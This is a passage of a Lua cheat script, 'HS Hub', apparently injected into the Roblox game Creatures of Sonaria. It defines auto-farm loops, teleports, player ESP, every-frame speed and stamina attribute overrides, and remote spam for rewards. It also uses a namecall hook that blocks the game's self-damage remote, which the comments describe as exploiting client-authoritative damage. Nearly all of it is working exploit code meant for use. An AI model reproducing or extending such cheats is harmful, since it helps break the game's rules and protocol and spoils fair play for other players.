    T:AddToggle({ Name='Auto Gacha Tokens', Key='AGT', Default=false, Callback=function(v) S.AutoGachaTokens=v end })

    local MT = Tab:CreateSection('MUTATION/TRAIT AUTOFARM')
    MT:AddLabel('Leave dropdowns empty to save any mutation/trait')
    MT:AddDropdown({ Name='Mutations', Key='MUT', Default='',
        Values={'','Albinism','Volcanic','Diamond','Shimmer','Overgrown','Glow Tail'},
        Callback=function(v) S.MutationTarget=v end })
    MT:AddToggle({ Name='Auto Mutation(s)', Key='AMUT', Default=false, Callback=function(v) S.AutoMutations=v end })
    MT:AddDropdown({ Name='Traits', Key='TRAIT', Default='',
        Values={'','Damage','Speed','Bite','Health','Stamina'},
        Callback=function(v) S.TraitTarget=v end })
    MT:AddToggle({ Name='Auto Trait(s)', Key='ATRAIT', Default=false, Callback=function(v) S.AutoTraits=v end })

    local Mu = Tab:CreateSection('MUSH AUTOFARM')
    Mu:AddLabel('Region Missions Status: Offline')
    Mu:AddToggle({ Name='Auto Missions', Key='AMIS', Default=false, Callback=function(v) S.AutoMissions=v end })

    local R = Tab:CreateSection('RECOMMENDED')
    R:AddDropdown({ Name='Select Creature', Key='SCR', Default='',
        Values={'','Slot1','Slot2','Slot3'}, Callback=function(v) S.SelectedCreature=v end })
    R:AddButton({ Name='Refresh Creature List', Callback=function() HSHub:Notify('Creature list refreshed', 'ok', 2) end })
    R:AddToggle({ Name='Auto Spawn', Key='ASP', Default=false, Callback=function(v) S.AutoSpawn=v end })
    R:AddSlider({ Name='Death Points Target', Key='DPT', Min=0, Max=5000, Default=1200, Suffix=' pts', Decimals=0,
        Callback=function(v) S.DeathPointsTarget=v end })
    R:AddToggle({ Name='Auto Self Kill', Key='ASK', Default=false,
        Tip='Fires LavaSelfDamage when DeathPoints >= target',
        Callback=function(v) S.AutoSelfKill=v end })
end

-- ─── Tab 4: ARTIFACTS (matches LUNAR Artifacts Autofarm tab) ───────
-- 9 Warden Shrines split into Low Value (4) and High Value (5)
local SHRINES_LOW  = { 'Hellion', 'Angelic', 'Garra', 'Verdant' }
local SHRINES_HIGH = { 'Boreal', 'Eigion', 'Novus', 'Ardor', 'Shadow' }

-- Per-shrine state flags
S.ArtifactToggles = {}
for _, n in ipairs(SHRINES_LOW)  do S.ArtifactToggles[n] = false end
for _, n in ipairs(SHRINES_HIGH) do S.ArtifactToggles[n] = false end
S.AutoServerHopArtifact = false

do
    local Tab = Window:CreateTab('Artifacts', '✦')

    local function makeShrineToggle(section, name)
        local key = ('AF_%s'):format(name)
        section:AddLabel(name .. ' Warden Shrine')
        section:AddLabel('Status: Available  ·  Progress: 0/?',
            Color3.fromRGB(150, 150, 180))
        section:AddToggle({ Name=('AutoFarm %s Artifact'):format(name),
            Key=key, Default=false,
            Tip=('Cycle creatures and deposit at %s Warden Shrine'):format(name),
            Callback=function(v) S.ArtifactToggles[name] = v end })
    end

    local Lo = Tab:CreateSection('LOW VALUE')
    for _, name in ipairs(SHRINES_LOW)  do makeShrineToggle(Lo, name) end

    local Hi = Tab:CreateSection('HIGH VALUE')
    for _, name in ipairs(SHRINES_HIGH) do makeShrineToggle(Hi, name) end

    local Rec = Tab:CreateSection('RECOMMEND')
    Rec:AddToggle({ Name='Auto Server Hop', Key='ASH_Art', Default=false,
        Tip="If the server's food runs out, hop to another",
        Callback=function(v) S.AutoServerHopArtifact = v end })
end

-- ─── Tab 5: TELEPORTS ───────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Teleports', '⛰')
    local Reg = Tab:CreateSection('REGION TELEPORTS')
    local regions = {
        {'Jungle',Vector3.new(1500,100,1500)},{'Algae Sandbar',Vector3.new(-2000,100,1000)},
        {'Central Rockfaces',Vector3.new(0,200,0)},{'Swamp Hill',Vector3.new(2500,150,-1000)},
        {'Coral Reef',Vector3.new(-1500,50,2500)},{'Desert',Vector3.new(-3000,100,-1500)},
        {'Grassy Shoal',Vector3.new(1000,100,-2000)},{'Rocky Drop',Vector3.new(-2500,300,500)},
        {'Redwoods',Vector3.new(2000,200,2500)},{'Mountains',Vector3.new(0,500,-3000)},
        {'Tundra',Vector3.new(-3000,150,3000)},{'Seaweed Depths',Vector3.new(500,-100,2500)},
        {'Flower Cave',Vector3.new(-500,-50,-500)},{'Mesa',Vector3.new(3500,250,0)},
    }
    for _, r in ipairs(regions) do
        local name, pos = r[1], r[2]
        Reg:AddButton({ Name=name, Callback=function()
            local root = getRoot()
            if root then root.CFrame = CFrame.new(pos); HSHub:Notify('TP: ' .. name, 'ok', 2) end
        end })
    end

    local Cu = Tab:CreateSection('CUSTOM TELEPORTS')
    local locs, sel = {}, ''
    Cu:AddDropdown({ Name='Custom Location', Key='CL', Default='', Values={''}, Callback=function(v) sel=v end })
    Cu:AddButton({ Name='Teleport to Location', Callback=function()
        local p = locs[sel]; if p then
            local root = getRoot(); if root then root.CFrame = CFrame.new(p); HSHub:Notify('TP: '..sel,'ok',2) end
        end
    end })
    local saveName = ''
    if Cu.AddTextbox then
        Cu:AddTextbox({ Name='Location Name', Default='', Placeholder='Enter name',
            Callback=function(v) saveName=v end })
    end
    Cu:AddButton({ Name='Save Location', Callback=function()
        local root = getRoot(); if not root then return end
        if saveName=='' then saveName='Loc_'..tostring(#locs+1) end
        locs[saveName]=root.Position; HSHub:Notify('Saved: '..saveName,'ok',2)
    end })
    Cu:AddButton({ Name='Delete Location', Callback=function()
        if sel~='' then locs[sel]=nil; HSHub:Notify('Deleted: '..sel,'ok',2) end
    end })
end

-- ─── Tab 6: EVENT ───────────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Event', '❄')
    Tab:CreateSection('MINIGAME(S)'):AddLabel('No active event minigames')
    Tab:CreateSection('INFORMATION'):AddLabel('Check Discord for events')
end

-- ─── Tab 7: ESP ─────────────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Esp', '◉')
    local G = Tab:CreateSection('GACHA TOKEN ESP')
    G:AddLabel('Note: also broken in LUNAR original')
    G:AddToggle({ Name='Explorer Gacha Token ESP', Key='EGE', Default=false, Callback=function(v) S.GachaEspExplorer=v end })
    G:AddToggle({ Name='Galaxy Gacha Token ESP',   Key='EGG', Default=false, Callback=function(v) S.GachaEspGalaxy=v end })
    G:AddToggle({ Name='Mecha Gacha Token ESP',    Key='EGM', Default=false, Callback=function(v) S.GachaEspMecha=v end })
    G:AddToggle({ Name='Monster Gacha Token ESP',  Key='EGMo',Default=false, Callback=function(v) S.GachaEspMonster=v end })
    G:AddToggle({ Name='Sweet Gacha Token ESP',    Key='EGSw',Default=false, Callback=function(v) S.GachaEspSweet=v end })

    local O = Tab:CreateSection('OTHERS ESP')
    O:AddToggle({ Name='Abandoned Eggs ESP', Key='AEE', Default=false, Callback=function(v) S.AbandonedEggsEsp=v end })
    O:AddButton({ Name='Teleport to Abandoned Egg', Callback=function()
        local egg = findNearestEgg()
        if egg then
            local part = egg:IsA('BasePart') and egg or egg:FindFirstChildWhichIsA('BasePart')
            if part then
                local root = getRoot()
                if root then root.CFrame = CFrame.new(part.Position + Vector3.new(0,5,0)) end
                HSHub:Notify('TP to abandoned egg','ok',2)
            end
        else
            HSHub:Notify('No abandoned eggs','warn',2)
        end
    end })

    local P = Tab:CreateSection('PLAYER ESP')
    P:AddToggle({ Name='Enable Player ESP', Key='EPE', Default=false, Callback=function(v) S.EnablePlayerEsp=v end })
    P:AddToggle({ Name='Display Health',    Key='DH',  Default=false, Callback=function(v) S.EspHealth=v end })
    P:AddToggle({ Name='Display Health Bar',Key='DHB', Default=false, Callback=function(v) S.EspHealthBar=v end })
    P:AddToggle({ Name='Display Tracer',    Key='DT',  Default=false, Callback=function(v) S.EspTracer=v end })
    P:AddToggle({ Name='Display Names',     Key='DN',  Default=false, Callback=function(v) S.EspNames=v end })
    P:AddToggle({ Name='Display Distance',  Key='DD',  Default=false, Callback=function(v) S.EspDistance=v end })
    P:AddToggle({ Name='Display 3D Box',    Key='DB',  Default=false, Callback=function(v) S.EspBox=v end })
    P:AddToggle({ Name='Display Chameleon', Key='DC',  Default=false, Callback=function(v) S.EspChameleon=v end })
end

-- ─── Tab 8: OTHERS ──────────────────────────────────────────────────
do
    local Tab = Window:CreateTab('Others', '⚙')
    local V = Tab:CreateSection('VISUAL')
    V:AddToggle({ Name='Remove Fog', Key='RF', Default=false, Callback=function(v) S.RemoveFog=v
        if v then Lighting.FogEnd=100000; Lighting.FogStart=100000 end end })
    V:AddToggle({ Name='Remove Camera Effects', Key='RCE', Default=false, Callback=function(v) S.RemoveCameraEffects=v end })
    V:AddToggle({ Name='Remove Disaster Effects', Key='RDE', Default=false, Callback=function(v) S.RemoveDisasterEffects=v end })

    local Mi = Tab:CreateSection('MISC')
    Mi:AddToggle({ Name='Hide Ping and FPS', Key='HPF', Default=false, Callback=function(v) S.HidePingFps=v end })
    Mi:AddToggle({ Name='Anti-AFK', Key='AAFK', Default=false, Callback=function(v) S.AntiAFK=v end })
    if Mi.AddTextbox then
        Mi:AddTextbox({ Name='Custom Name', Default='', Placeholder='Enter name', Callback=function(v) S.CustomName=v end })
    end
    Mi:AddToggle({ Name='Hide Username (Client-Sided)', Key='HU', Default=false, Callback=function(v) S.HideUsername=v end })

    local Disc = Tab:CreateSection('DISCORD')
    Disc:AddButton({ Name='Copy Discord Link', Callback=function()
        if setclipboard then setclipboard('https://discord.gg/5rpP6faZSJ') end
        HSHub:Notify('Discord link copied','ok',2)
    end })

    local La = Tab:CreateSection('ANTI-LAG')
    La:AddToggle({ Name='Low Quality Textures', Key='LQT', Default=false, Callback=function(v) S.LowQualityTextures=v
        if v then pcall(function() settings().Rendering.QualityLevel=Enum.QualityLevel.Level01 end) end end })
    La:AddToggle({ Name='White Screen', Key='WSC', Default=false, Callback=function(v) S.WhiteScreen=v end })

    local Sr = Tab:CreateSection('SERVERS')
    Sr:AddButton({ Name='Rejoin Server', Callback=function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
    end })
    Sr:AddButton({ Name='Server Hop', Callback=function()
        local ok, raw = pcall(function()
            return game:HttpGet('https://games.roblox.com/v1/games/'..tostring(game.PlaceId)
                ..'/servers/Public?sortOrder=Asc&limit=100')
        end)
        if ok and raw then
            local d = HttpService:JSONDecode(raw)
            if d and d.data then
                for _, s in ipairs(d.data) do
                    if s.playing < s.maxPlayers and s.id ~= game.JobId then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LP); return
                    end
                end
            end
        end
        HSHub:Notify('No servers found','warn',2)
    end })
end

-- ═══════════════════════════════════════════════════════════════════
--   FEATURE LOOPS (with ground-truth bindings)
-- ═══════════════════════════════════════════════════════════════════

-- AutoEat: TP to nearest food + spam Food:FireServer until Hunger=100%
task.spawn(function()
    local savedCF
    while true do
        task.wait(1)
        if S.AutoEat and not S.AutoMissions then
            pcall(function()
                local char = getChar()
                if char and hudStatText('Hunger') ~= '100%' then
                    local food = findNearestFood()
                    if food then
                        local foodPart = food:IsA('Model') and (food.PrimaryPart or food:FindFirstChild('Food') or food:FindFirstChildWhichIsA('BasePart')) or food
                        if foodPart and foodPart:IsA('BasePart') then
                            local v = foodPart.Position
                            local root = getRoot()
                            if root then
                                if not savedCF then savedCF = root.CFrame end
                                root.CFrame = CFrame.new(v - Vector3.new(0,20,0))
                                local n = 0
                                repeat
                                    task.wait(0.1)
                                    fire('Food', food)
                                    if getRoot() then getRoot().CFrame = CFrame.new(v - Vector3.new(0,20,0)) end
                                    n = n + 1
                                until hudStatText('Hunger') == '100%' or not S.AutoEat or not food.Parent or n > 60
                                if savedCF and getRoot() then
                                    getRoot().CFrame = savedCF; savedCF = nil
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)

-- AutoDrink: noted broken in LUNAR (probably lake-detection issue)
-- Still implemented for completeness; uses Lakes folder
task.spawn(function()
    while true do
        task.wait(0.1)
        if S.AutoDrink and not S.AutoMissions then
            pcall(function()
                if getChar() and hudStatText('Thirst') ~= '100%' then
                    local lake = findNearestLake()
                    fire('DrinkRemote', lake)
                end
            end)
        end
    end
end)

-- AutoMudRoll: TP to nearest mud + spam Mud:FireServer until Muddy attribute
task.spawn(function()
    local savedCF
    while true do
        task.wait(0.1)
        if S.AutoMudRoll and not S.AutoMissions then
            pcall(function()
                local char = getChar()
                if char and not char:GetAttribute('Muddy') then
                    local mud = findNearestMud()
                    if mud then
                        local mudPart = mud:IsA('Model') and (mud.PrimaryPart or mud:FindFirstChildWhichIsA('BasePart')) or mud
                        if mudPart and mudPart:IsA('BasePart') then
                            local target = mudPart.Position + Vector3.new(0, mudPart.Size.Y/2, 0)
                            local root = getRoot()
                            if root then
                                if not savedCF then savedCF = root.CFrame end
                                local n = 0
                                repeat
                                    task.wait(0.1)
                                    if getRoot() then getRoot().CFrame = CFrame.new(target) end
                                    fire('Mud', mud)
                                    n = n + 1
                                until char:GetAttribute('Muddy') or not S.AutoMudRoll or n > 60
                                if savedCF and getRoot() then getRoot().CFrame = savedCF; savedCF = nil end
                            end
                        end
                    end
                end
            end)
        end
    end
end)

-- AutoShelter: Sheltered:FireServer(true) when shelter indicator is red
task.spawn(function()
    while true do
        task.wait(0.5)
        if S.AutoShelter then
            pcall(function()
                local c = shelterColor()
                if c and (c.R > 0.9 and c.G < 0.1 and c.B < 0.1) then
                    fire('Sheltered', true)
                end
            end)
        end
    end
end)

-- AutoSelfKill: fire LavaSelfDamage when DeathPoints >= target
task.spawn(function()
    while true do
        task.wait(1)
        if S.AutoSelfKill then
            pcall(function()
                if getChar() then
                    S.NoLavaDamage = false
                    fire('LavaSelfDamage')
                end
            end)
        end
    end
end)

-- ════════════════════════════════════════════════════════════════════
-- CREATURE CYCLING (AutoFarmMutations / AutoFarmTraits / AutoArtifactFarm)
-- ════════════════════════════════════════════════════════════════════
-- LUNAR pattern (chunk3_pretty line 794+ and 1655+):
--   1. require PlayerWrapper module to get current slot
--   2. Check if current creature matches target (mutation/trait/any)
--   3. If not match: StoreActiveCreatureRemote + CreateSlotRemote to cycle
--   4. Trigger HUDGui.SaveSelectionReturn(true) for UI sync

local function safeRequire(path)
    local ok, m = pcall(function() return require(path) end)
    if ok then return m end
end

local function getPlayerWrapper()
    local rf = ReplicatedStorage:FindFirstChild('_replicationFolder')
    if rf then
        local pw = rf:FindFirstChild('PlayerWrapper')
        if pw then return safeRequire(pw) end
    end
end

local function getHUDGuiModule()
    local rf = ReplicatedStorage:FindFirstChild('_replicationFolder')
    if rf then
        local hg = rf:FindFirstChild('HUDGui')
        if hg then return safeRequire(hg) end
    end
end

local function getCurrentSlot()
    local pw = getPlayerWrapper()
    if pw and pw.GetClient then
        local ok, client = pcall(function() return pw:GetClient() end)
        if ok and client and client.GetCurrentSlot then
            local ok2, slot = pcall(function() return client:GetCurrentSlot() end)
            if ok2 then return slot end
        end
    end
end

local function getActiveCreature()
    -- LUNAR's f() / z() finder — find current loaded creature in workspace
    local char = getChar()
    if not char then return nil end
    -- The creature model is usually the character itself or a child
    return char
end

local function getCreatureAttribute(creature, attr)
    if not creature then return nil end
    local ok, v = pcall(function() return creature:GetAttribute(attr) end)
    if ok then return v end
end

local function creatureMatchesTarget(creature, mutTarget, traitTarget)
    if not creature then return false end
    if mutTarget and mutTarget ~= '' then
        if getCreatureAttribute(creature, mutTarget) then return true end
    end
    if traitTarget and traitTarget ~= '' then
        if getCreatureAttribute(creature, traitTarget) then return true end
    end
    return false
end

-- ════════════════════════════════════════════════════════════════════
-- ARTIFACT SHRINE HELPERS
-- ════════════════════════════════════════════════════════════════════

-- Find the shrine model in workspace.Interactions["Warden Shrines"]
local function findShrine(name)
    local i = interactions(); if not i then return nil end
    local shrines = i:FindFirstChild('Warden Shrines'); if not shrines then return nil end
    -- Match either exact name, "<name> Warden Shrine", or substring
    local lname = name:lower()
    for _, s in ipairs(shrines:GetDescendants()) do
        local sn = s.Name:lower()
        if sn == lname or sn:find(lname, 1, true) then
            if s:IsA('Model') or s:IsA('BasePart') then return s end
        end
    end
    return nil
end

-- Get an enabled shrine (first one toggled on)
local function getActiveShrine()
    for _, n in ipairs(SHRINES_LOW) do
        if S.ArtifactToggles[n] then return n, findShrine(n) end
    end
    for _, n in ipairs(SHRINES_HIGH) do
        if S.ArtifactToggles[n] then return n, findShrine(n) end
    end
    return nil
end

-- ════════════════════════════════════════════════════════════════════
-- MAIN CYCLING LOOP — handles AutoFarmMutations, AutoFarmTraits,
-- AND per-shrine ArtifactFarm toggles
-- ════════════════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(1)
        local mutOn = S.AutoMutations
        local trOn  = S.AutoTraits
        local shrineName, shrineModel = getActiveShrine()
        local artOn = shrineModel ~= nil

        if artOn and shrineName and shrineModel then pcall(function()
            -- ARTIFACT FARM V10 (MapDump-verified 2026-05-27):
            --   - Shrines are Folders containing <Name>Tablet MeshPart (the offer spot)
            --   - Carcass variants: "Carcass" / "Sea Carcass" / "NPC Carcass"
            --     Use is_carcass attribute (FoodDataName contains "Carcass")
            --   - Shrine→region mapping (loads content): e.g. Hellion → Desert
            local root = getRoot()
            if not root then return end

            -- Step 1: find nearest carcass-type food (any of 3 variants)
            local foodFolder = (interactions() or {}):FindFirstChild('Food')
            local nearestCarcass, nearestDist = nil, math.huge
            if foodFolder then
                for _, m in ipairs(foodFolder:GetChildren()) do
                    local isCarcass = false
                    pcall(function()
                        local fd = m:GetAttribute('FoodDataName')
                        if fd and tostring(fd):find('Carcass') then isCarcass = true end
                    end)
                    if not isCarcass and m.Name:find('Carcass') then isCarcass = true end
                    if isCarcass then
                        local part = m:IsA('BasePart') and m
                            or (m:IsA('Model') and (m.PrimaryPart or m:FindFirstChildWhichIsA('BasePart')))
                        if part then
                            local d = (part.Position - root.Position).Magnitude
                            if d < nearestDist then nearestCarcass, nearestDist = m, d end
                        end
                    end
                end
            end

            -- Step 2: TP to carcass + pickup (FoodPickup RemoteFunction)
            if nearestCarcass then
                local fpart = nearestCarcass:IsA('BasePart') and nearestCarcass
                    or (nearestCarcass.PrimaryPart or nearestCarcass:FindFirstChildWhichIsA('BasePart'))
                if fpart then
                    pcall(function() root.CFrame = fpart.CFrame + Vector3.new(0, 5, 0) end)
                    task.wait(0.4)
                    local pickup = getRemote('FoodPickup')
                    if pickup then
                        pcall(function() pickup:InvokeServer(nearestCarcass) end)
                    end
                    task.wait(0.3)
                end
            end

            -- Step 3: find shrine tablet (shrines are Folders containing <Name>Tablet MeshPart)
            local tablet = nil
            for _, d in ipairs(shrineModel:GetDescendants()) do
                if d:IsA('BasePart') then
                    -- Prefer "Tablet" named parts
                    if d.Name:find('Tablet') then tablet = d; break end
                    if not tablet then tablet = d end -- fallback to first BasePart
                end
            end

            -- Step 4: TP to shrine tablet
            if tablet then
                local root2 = getRoot()
                if root2 then
                    pcall(function() root2.CFrame = tablet.CFrame + Vector3.new(0, 8, 0) end)
                    task.wait(0.5)
                end
            end

            -- Step 5: Offer (WardenOffering:InvokeServer("<ShrineName>") returns true on success)
            local wo = getRemote('WardenOffering')
            if wo then
                pcall(function() wo:InvokeServer(shrineName) end)
            end
        end) end

        if mutOn or trOn then pcall(function()
            -- Mutation/Trait farm via creature cycling
            if not getChar() then return end
            local slot = getCurrentSlot()
            if not slot then return end
            local creature = getActiveCreature()

            if creatureMatchesTarget(creature, S.MutationTarget, S.TraitTarget) then
                return
            end

            local hudMod = getHUDGuiModule()
            if hudMod and hudMod.SaveSelectionReturn then
                pcall(function() hudMod.SaveSelectionReturn(true) end)
                task.wait(0.5)
            end

            local storeR = getRemote('StoreActiveCreatureRemote')
            local createR = getRemote('CreateSlotRemote')
            if storeR and createR then
                pcall(function() storeR:InvokeServer(slot) end)
                task.wait(0.5)
                local dinoVal = creature and creature:FindFirstChild('Dino')
                if dinoVal and dinoVal.Value then
                    pcall(function() createR:InvokeServer(dinoVal.Value) end)
                end
            end
        end) end
    end
end)

-- Auto Server Hop (Artifacts tab Recommend) — same as Others tab Server Hop
task.spawn(function()
    while true do
        task.wait(30)
        if S.AutoServerHopArtifact then
            pcall(function()
                local ok, raw = pcall(function()
                    return game:HttpGet('https://games.roblox.com/v1/games/'..tostring(game.PlaceId)
                        ..'/servers/Public?sortOrder=Asc&limit=100')
                end)
                if ok and raw then
                    local d = HttpService:JSONDecode(raw)
                    if d and d.data then
                        for _, srv in ipairs(d.data) do
                            if srv.playing < srv.maxPlayers and srv.id ~= game.JobId then
                                TeleportService:TeleportToPlaceInstance(game.PlaceId, srv.id, LP)
                                return
                            end
                        end
                    end
                end
            end)
        end
    end
end)

-- AutoSpawn: respawn dead creature
task.spawn(function()
    while true do
        task.wait(1)
        if S.AutoSpawn then
            pcall(function()
                if not getChar() then
                    local slot = S.SelectedCreature
                    if slot ~= '' then
                        invoke('RestartSlotRemote', slot, false)
                    end
                end
            end)
        end
    end
end)

-- AutoGachaTokens: GetSpawnedTokenRemote:InvokeServer() — periodic pickup
task.spawn(function()
    while true do
        task.wait(0.5)
        if S.AutoGachaTokens then
            pcall(function() invoke('GetSpawnedTokenRemote') end)
        end
    end
end)

-- AutoAcceptNest: loop other players, fire AcceptRequest on their Remotes folder
task.spawn(function()
    while true do
        task.wait(5)
        if S.AutoAcceptNest then
            pcall(function()
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LP and p:FindFirstChild('Settings') then
                        local n = p.Settings:FindFirstChild('Nesting')
                        if n and (n.Value == S.InvitationType or S.InvitationType == 'Everyone') then
                            fireOnPlayer(p, 'NestRequestRemote', 'AcceptRequest')
                        end
                    end
                end
            end)
        end
    end
end)

-- AutoNestUpgrade: ResourceDamageRemote + UpgradeNest
task.spawn(function()
    while true do
        task.wait(0.5)
        if S.AutoNestUpgrade then
            pcall(function()
                for i = 1, 3 do fire('ResourceDamageRemote') end
                invoke('UpgradeNest', S.NestUpgradeTarget)
            end)
        end
    end
end)

-- AlwaysLayEffect: Lay:FireServer(true)  (chunk3 line 987)
-- Pattern: while AlwaysLayEffect and task.wait(1) do; Lay:FireServer(unpack({[1]=true})); end
task.spawn(function()
    while true do
        task.wait(1)
        if S.AlwaysLayEffect then
            pcall(function() fire('Lay', true) end)
        end
    end
end)

-- AutoAggression: StateAilment:FireServer("Aggression")  (chunk3 line 5386)
-- Pattern: only fire when creature doesn't already have Aggression attribute
task.spawn(function()
    while true do
        task.wait(1)
        if S.AutoAggressive then
            pcall(function()
                local c = getChar()
                if c and not c:GetAttribute('Aggression') then
                    fire('StateAilment', 'Aggression')
                end
            end)
        end
    end
end)

-- AutoScentHidden: HideScent:FireServer()  (chunk3 line 5303)
-- Pattern: only fire when char doesn't already have HideScent attribute
task.spawn(function()
    while true do
        task.wait(1)
        if S.AutoScentHidden then
            pcall(function()
                local c = getChar()
                if c and not c:GetAttribute('HideScent') then
                    fire('HideScent')
                end
            end)
        end
    end
end)

-- AutoCowerState: StateAilment:FireServer("Cower")  (chunk3 m=function line 1534)
-- Pattern: only fire when creature doesn't already have Cower attribute
S.AutoCowerStateValue = false  -- ensure flag exists
task.spawn(function()
    while true do
        task.wait(1)
        if S.AutoCowerStateValue then
            pcall(function()
                local c = getChar()
                if c and not c:GetAttribute('Cower') then
                    fire('StateAilment', 'Cower')
                end
            end)
        end
    end
end)

-- AutoNestValue: TP + Nest:FireServer when Age > 66  (chunk3 line 1002)
S.AutoNestValue = false
task.spawn(function()
    while true do
        task.wait(5)
        if S.AutoNestValue then
            pcall(function()
                local c = getChar()
                if not c or not c:FindFirstChild('HumanoidRootPart') then return end
                local age = c:GetAttribute('Age') or 0
                if age <= 66 then return end
                local pos = c.HumanoidRootPart.Position
                local nests = Workspace:FindFirstChild('Interactions')
                nests = nests and nests:FindFirstChild('Nests')
                if not nests or not nests:FindFirstChild(LP.Name) then
                    fire('Nest', { pos, Vector3.yAxis })
                end
            end)
        end
    end
end)

-- ════════════════════════════════════════════════════════════════════
-- PHASE 2 V13: Custom Stats (AttrDump-verified 2026-05-27)
-- Real attribute names on Character.Data folder (mangled single letters):
--   's'  = Walk Speed   (default ~31)
--   'ss' = Sprint Speed (default ~105, LUNAR shows 115)
--   'fs' = Fly Speed    (default ~39, LUNAR shows 40)
--   'tr' = Turn Radius  (default 1)
-- Location: Workspace.Characters.<player>.Data folder, ALSO mirrored on
-- Character itself (game reads from one, server reads from other).
-- Strategy: set on BOTH Character + Character.Data every frame.
-- ════════════════════════════════════════════════════════════════════

local function setStatAttr(char, key, value)
    if not char then return end
    pcall(function() char:SetAttribute(key, value) end)
    local data = char:FindFirstChild('Data')
    if data then
        pcall(function() data:SetAttribute(key, value) end)
    end
end

task.spawn(function()
    while true do
        task.wait()  -- every frame
        local c = getChar()
        if c then
            if S.EnableWalkSpeed   then setStatAttr(c, 's',  S.WalkSpeed) end
            if S.EnableSprintSpeed then setStatAttr(c, 'ss', S.SprintSpeed) end
            if S.EnableFlySpeed    then setStatAttr(c, 'fs', S.FlySpeed) end
            if S.EnableTurnRadius  then setStatAttr(c, 'tr', S.TurnRadius) end
            -- Backup: Humanoid.WalkSpeed (some games combine attribute + Humanoid)
            if S.EnableWalkSpeed then
                local h = c:FindFirstChildOfClass('Humanoid')
                if h then pcall(function() h.WalkSpeed = S.WalkSpeed end) end
            end
        end
    end
end)

-- ════════════════════════════════════════════════════════════════════
-- PHASE 1: Infinite Stamina (chunk3 line 902-915 verified pattern)
-- Real attribute names: 'st' (stamina) and 'sr' (stamina regen)
-- Value: 10000 (NOT 100)
-- Hook AttributeChanged('st') to keep at 10000 even when server tries reset
-- ════════════════════════════════════════════════════════════════════
local _infStaminaHookedChar = nil
task.spawn(function()
    while true do
        task.wait(0.3)
        if S.InfStamina then
            pcall(function()
                local c = getChar()
                if not c then return end
                local hasSt = c:GetAttribute('st') ~= nil
                local hasSr = c:GetAttribute('sr') ~= nil

                if hasSt and hasSr then
                    -- Path A: creature has st/sr attributes
                    pcall(function() c:SetAttribute('sr', 10000) end)
                    pcall(function() c:SetAttribute('st', 10000) end)
                    -- One-shot hook to keep value when server resets
                    if _infStaminaHookedChar ~= c then
                        _infStaminaHookedChar = c
                        pcall(function()
                            c:GetAttributeChangedSignal('st'):Connect(function()
                                if S.InfStamina and c.Parent then
                                    pcall(function() c:SetAttribute('sr', 10000) end)
                                    pcall(function() c:SetAttribute('st', 10000) end)
                                end
                            end)
                        end)
                    end
                else
                    -- Path B: fallback via PlayerWrapper:GetCurrentCharacter()
                    local pw = getPlayerWrapper()
                    if pw and pw.GetClient then
                        pcall(function()
                            local client = pw:GetClient()
                            if client and client.GetCurrentCharacter then
                                local ch = client:GetCurrentCharacter()
                                if ch and ch.StaminaTracker then
                                    ch.StaminaTracker.Stamina = ch.StaminaTracker:GetMaxStamina()
                                end
                            end
                        end)
                    end
                end
            end)
        else
            _infStaminaHookedChar = nil
        end
    end
end)

-- Reset hook tracker on character respawn
LP.CharacterAdded:Connect(function() _infStaminaHookedChar = nil end)

-- ════════════════════════════════════════════════════════════════════
-- PHASE 3: No Damage via remote-block (RemoteHook-verified 2026-05-29)
-- CoS is client-authoritative for environmental damage: the CLIENT fires
-- a remote to hurt ITSELF. e.g. LavaSelfDamage:FireServer() in lava.
-- (Confirmed: HSHub_RemoteHook capture, hooks_ok includes "LavaSelfDamage".)
--
-- Uses the shared Stealth namecall hook: register a handler that DROPS
-- FireServer when self.Name is in BLOCK and its toggle is on. Stealth's
-- dispatcher already guards checkcaller() (our own fire() helper passes
-- through) and a non-nil return short-circuits the real call = blocked.
--
-- EXTEND LATER: when we capture Drowning/Meteor/Moisture/Tornado remotes,
-- just add rows to BLOCK below — no other change needed.
-- ════════════════════════════════════════════════════════════════════
do
    local BLOCK = {
        LavaSelfDamage = function() return S.NoLavaDamage end,
        -- Drowning  = function() return S.NoDrowningDamage end,   -- TODO: capture remote name
        -- Meteor    = function() return S.NoMeteorDamage end,     -- TODO
        -- Moisture  = function() return S.NoMoistureDamage end,   -- TODO
        -- Tornado   = function() return S.NoTornadoDamage end,    -- TODO
    }
    pcall(function()
        if not (Stealth and Stealth.RegisterNamecall and Stealth.InstallNamecallHook) then return end
        Stealth.RegisterNamecall('HSHub_NoDamage', function(self, method, _args)
            if method ~= 'FireServer' then return nil end
            local ok, nm = pcall(function() return self.Name end)
            if not ok then return nil end
            local pred = BLOCK[nm]
            if pred and pred() == true then
                return false   -- non-nil => Stealth short-circuits; real FireServer never runs
            end
            return nil          -- pass through to the real namecall
        end)
        Stealth.InstallNamecallHook()   -- idempotent (guarded by _nchooked)
    end)
end

-- Visual loops
task.spawn(function()
    while true do
        task.wait(2)
        if S.RemoveFog then
            Lighting.FogEnd = 100000; Lighting.FogStart = 100000
        end
    end
end)

HSHub:Notify('HS Hub loaded · Creatures of Sonaria · HS-COS-V4', 'ok', 3)

